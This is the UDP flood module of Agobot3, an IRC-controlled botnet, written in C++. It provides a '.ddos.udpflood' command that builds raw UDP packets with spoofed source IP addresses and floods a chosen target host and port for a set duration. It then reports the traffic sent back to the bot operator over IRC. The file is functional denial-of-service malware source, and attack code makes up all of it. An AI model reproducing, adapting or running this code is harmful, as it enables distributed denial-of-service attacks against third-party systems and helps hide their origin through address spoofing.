/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (C) 2003 Ago

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#include "main.h"
#include "mainctrl.h"

// #define FAKE_SOURCE_IP "192.168.1.1"

// Usage: .ddos.udpflood <target> <port>[0=rand] <time>(secs) <delay>(ms)

typedef struct ip_hdr1
{
    unsigned char  ip_verlen;        // version & IHL		 => 1 Bytes  (combined size of both)
    unsigned char  ip_tos;           // TOS					 => 1 Bytes
    unsigned short ip_totallength;   // Total length		 => 2 Bytes
    unsigned short ip_id;            // Identification	 	 =>	2 Bytes
    unsigned short ip_offset;        // Fragment Offset		 =>	2 Bytes
    unsigned char  ip_ttl;           // Time to live		 =>	1 Bytes
    unsigned char  ip_protocol;      // Protocol			 =>	1 Bytes
    unsigned short ip_checksum;      // Header checksum		 =>	2 Bytes
    unsigned int   ip_srcaddr;       // Source address		 => 4 Bytes
    unsigned int   ip_destaddr;      // Destination address	 => + 4 Bytes
				     
					//									     = 20 Bytes
}IP_HDR;

typedef struct udp_hdr1
{
    unsigned short sport;	     // Source Port		 =>	2 Bytes
    unsigned short dport;	     // Destination Port =>	2 Bytes
    unsigned short Length; 	     // Length			 =>	2 Bytes
    unsigned short Checksum;	 // Checksum		 => + 2 Bytes
				     
							  //					 =  8 Bytes
}UDP_HDR;

USHORT checksum1(USHORT *buffer, int size)
{
    unsigned long cksum=0;
    while (size > 1)
    {
        cksum += *buffer++;
        size  -= sizeof(USHORT);   
    }
    if (size)
    {
        cksum += *(UCHAR*)buffer;   
    }
    cksum = (cksum >> 16) + (cksum & 0xffff);
    cksum += (cksum >>16); 
    return (USHORT)(~cksum); 
}

long UDPFlood(char *target, int port, int len, int delay);

CDDOSUDPFlood::CDDOSUDPFlood() { m_sDDOSName.Assign("udpflood"); }

void CDDOSUDPFlood::StartDDOS()
{
g_pMainCtrl->m_cIRC.SendFormat(m_bSilent, m_bNotice, m_sReplyTo.Str(), "%s: flooding %s port %u for %u seconds, %d ms delay.", m_sDDOSName.CStr(), m_sHost.CStr(), m_iPort, m_iTime, m_iDelay);
CString sReply; sReply.Format("%s: %s:%d [%i]", m_sDDOSName.CStr(), m_sHost.CStr(), m_iPort, UDPFlood(m_sHost.Str(), m_iPort, m_iTime, m_iDelay)/1024/m_iTime);
g_pMainCtrl->m_cIRC.SendFormat(m_bSilent, m_bNotice, m_sReplyTo.Str(), "%s", sReply.CStr());
}

time_t elapsed;

long SendUDP(unsigned long TargetIP, unsigned long SpoofingIP, unsigned short TargetPort, int len, int delay)
{	
	int rect; unsigned long lTimerCount=0; bool bRandPort=false;
	// unsigned long lSpoofIP = SpoofingIP; char *szSpoofIP=(char*)&lSpoofIP;
	long k=0;

	CHAR szLocalIP[80];
    LPHOSTENT lpLocalIPStruct;
    IN_ADDR inLocalIPStruct;
    CHAR szIPAddr[100];
    LPTSTR lpszTemp;

    lpszTemp = NULL;

	int lIPAddrA = 255;
	int lIPAddrB = 255;
	int lIPAddrC = 255;
	int lIPAddrD = 255;

	CHAR szIPAddrA[4];
    CHAR szIPAddrB[4];
    CHAR szIPAddrC[4];
    CHAR szIPAddrD[4];

	if (gethostname(szLocalIP, sizeof(szLocalIP)) != SOCKET_ERROR)
    {
        lpLocalIPStruct = gethostbyname(szLocalIP);
        if (lpLocalIPStruct != 0)
        {
            if (lpLocalIPStruct->h_addr_list[0] != 0)
            {
                /* cram the ip_addr into the 4 global variables */
                memcpy(&inLocalIPStruct, lpLocalIPStruct->h_addr_list[0], sizeof(IN_ADDR));
                sprintf(szIPAddr, "%s", inet_ntoa(inLocalIPStruct));
                lpszTemp = strtok(szIPAddr, ".");
                lIPAddrA = atoi(lpszTemp);
                lpszTemp = strtok(NULL, ".");
                lIPAddrB = atoi(lpszTemp);
                lpszTemp = strtok(NULL, ".");
                lIPAddrC = atoi(lpszTemp);
                lpszTemp = strtok(NULL, ".");
                lIPAddrD = atoi(lpszTemp);
            }
        }
    }
	
//	szSpoofIP[0]=(char)brandom_nosleep(0, 255);	szSpoofIP[1]=(char)brandom_nosleep(0, 255);
//	szSpoofIP[2]=(char)brandom_nosleep(0, 255); szSpoofIP[3]=(char)brandom_nosleep(0, 255);

	WSADATA wsadata;
	int x;
	lTimerCount=GetTickCount();

	if(TargetPort == 0)
	{
		bRandPort=true;
		TargetPort=brandom(1, 65535);
	}

	WSAStartup(MAKEWORD(2,2), &wsadata);

	SOCKET sock;
	SOCKADDR_IN addr_in;
	IP_HDR ipHeader;
	UDP_HDR udpHeader;
	int nRetCode;
	char* pBuffer;
	char* pSendBuffer;
	int nBufferSize = 256;

	BOOL flag=TRUE;
	int iTotalSize,iUdpCheckSumSize,i,j;
	char *ptr=NULL;

	pBuffer = (char*) malloc(nBufferSize);
	FillMemory(pBuffer, nBufferSize, 'A');
	pSendBuffer = (char*) malloc(nBufferSize + 60);

	//sock = WSASocket(AF_INET,SOCK_RAW,IPPROTO_UDP,NULL,0,0); // IPPROTO_RAW?
	sock = WSASocket(AF_INET,SOCK_RAW,IPPROTO_UDP,NULL,0,0);
	if (sock==INVALID_SOCKET)
	{
	return false;;
	}

	if(setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char*)&flag, sizeof(flag))==SOCKET_ERROR)
	{
	return false;;
	}

	addr_in.sin_family=AF_INET;
	addr_in.sin_port=htons(TargetPort);
	addr_in.sin_addr.s_addr=TargetIP;

	ipHeader.ip_verlen=(4<<4|sizeof(ipHeader)/sizeof(unsigned long));
	ipHeader.ip_totallength=htons(sizeof(ipHeader)+sizeof(udpHeader));
	ipHeader.ip_id=0; ipHeader.ip_offset=0; ipHeader.ip_ttl=64;
	ipHeader.ip_protocol=IPPROTO_UDP; ipHeader.ip_checksum=0; ipHeader.ip_destaddr=TargetIP;

	iTotalSize=sizeof(ipHeader) + sizeof(udpHeader)+ nBufferSize;

	while(g_pMainCtrl->m_cDDOS.m_bDDOSing)
	{
		k++;

		sprintf(szIPAddrA,"%d",lIPAddrA);
		strcat(szIPAddr, ".");
		sprintf(szIPAddrB,"%d",lIPAddrB);
		strcat(szIPAddr, ".");
		itoa(rand() % 254, szIPAddrC, 10);
		itoa(rand() % 253 + 1, szIPAddrD, 10);
		strcpy(szIPAddr, szIPAddrA);
		strcat(szIPAddr, ".");
		strcat(szIPAddr, szIPAddrB);
		strcat(szIPAddr, ".");
		strcat(szIPAddr, szIPAddrC);
		strcat(szIPAddr, ".");
		strcat(szIPAddr, szIPAddrD);
		
		ipHeader.ip_srcaddr = htonl(ntohl(inet_addr(szIPAddr)));
		//ipHeader.ip_srcaddr = htonl(szIPAddr);
		//ipHeader.ip_srcaddr=htonl(SpoofingIP++);

		udpHeader.sport = htons((rand()%1001)+1000);
		udpHeader.dport = htons(TargetPort);
		udpHeader.Length = htons(sizeof(udpHeader) + nBufferSize);
		udpHeader.Checksum = 0;

		ptr = NULL;

		ZeroMemory(pSendBuffer, nBufferSize + 60);
		ptr = pSendBuffer;
		iUdpCheckSumSize=0;
		udpHeader.Checksum = 0;

		memcpy(ptr, &ipHeader.ip_srcaddr, sizeof(ipHeader.ip_srcaddr));
		ptr += sizeof(ipHeader.ip_srcaddr);
		iUdpCheckSumSize += sizeof(ipHeader.ip_srcaddr);

		memcpy(ptr, &ipHeader.ip_destaddr, sizeof(ipHeader.ip_destaddr));
		ptr += sizeof(ipHeader.ip_destaddr);
		iUdpCheckSumSize += sizeof(ipHeader.ip_destaddr);

		ptr++;
		iUdpCheckSumSize++;

		memcpy(ptr, &ipHeader.ip_protocol, sizeof(ipHeader.ip_protocol));
		ptr += sizeof(ipHeader.ip_protocol);
		iUdpCheckSumSize += sizeof(ipHeader.ip_protocol);

		memcpy(ptr, &udpHeader.Length, sizeof(udpHeader.Length));
		ptr += sizeof(udpHeader.Length);
		iUdpCheckSumSize += sizeof(udpHeader.Length);

		memcpy(ptr, &udpHeader, sizeof(udpHeader));
		ptr += sizeof(udpHeader);
		iUdpCheckSumSize += sizeof(udpHeader);

		memcpy(ptr, pBuffer, nBufferSize);
		iUdpCheckSumSize += nBufferSize;

		udpHeader.Checksum=checksum((USHORT*)pSendBuffer,iUdpCheckSumSize);

		memcpy(pSendBuffer, &ipHeader, sizeof(ipHeader));
		memcpy(pSendBuffer + sizeof(ipHeader), &udpHeader, sizeof(udpHeader));
		memcpy(pSendBuffer + sizeof(ipHeader) + sizeof(udpHeader), pBuffer, nBufferSize);

		rect=sendto(sock, pSendBuffer, iTotalSize, 0, (struct sockaddr*)&addr_in, sizeof(addr_in));
		
		if(rect==SOCKET_ERROR) {
		return false;
		}
		
		if((GetTickCount()-lTimerCount)/1000>len) {break;}

		if(bRandPort) { TargetPort=brandom(1, 65535); }

		lIPAddrD++;

		if (lIPAddrD > 254)
		{
			lIPAddrD = 1;
			lIPAddrC++;
			if (lIPAddrC > 254)
			{
				lIPAddrC = 0;
				lIPAddrB++;
				if (lIPAddrB > 254)
				{
					lIPAddrB = 0;
				}
			}
		}

		brandom(0, 255);

		Sleep(delay);
		
		}

#ifdef _WIN32
	closesocket(sock);
#else
	close(sock);
#endif
free(pBuffer);
free(pSendBuffer);
return (sizeof(ipHeader)+sizeof(udpHeader)*k);
}

long UDPFlood(char *target, int port, int len, int delay)
{	unsigned long TargetIP; unsigned long SpoofIP;
	CDNS cDNS; TargetIP=cDNS.ResolveAddress(target); SpoofIP=TargetIP+((rand()%512)+256);
	return SendUDP(TargetIP, SpoofIP, port, len, delay); }
